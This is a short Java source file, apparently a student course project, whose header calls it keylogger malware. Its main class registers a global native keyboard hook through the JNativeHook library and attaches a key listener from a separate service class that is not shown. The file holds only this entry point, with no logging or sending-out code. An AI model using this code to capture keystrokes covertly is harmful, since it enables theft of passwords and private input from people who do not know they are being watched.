// Author: Himnish Kaila
// Date: June 5th 2024
// Description: CPT FOR ICS4U1: Keylogger malware

package main;

import handlers.ManageService;
import org.jnativehook.GlobalScreen;

public class Main {
    public static void main(String[] args) {
        // Calls the manage service class
        ManageService service = new ManageService();

        // GlobalScreen is used to give java access to the computer screen
        try {
            GlobalScreen.registerNativeHook();
        } catch (Throwable e) {
            e.printStackTrace();
        }

        GlobalScreen.getInstance().addNativeKeyListener(service.getKeyboard());
    }
}



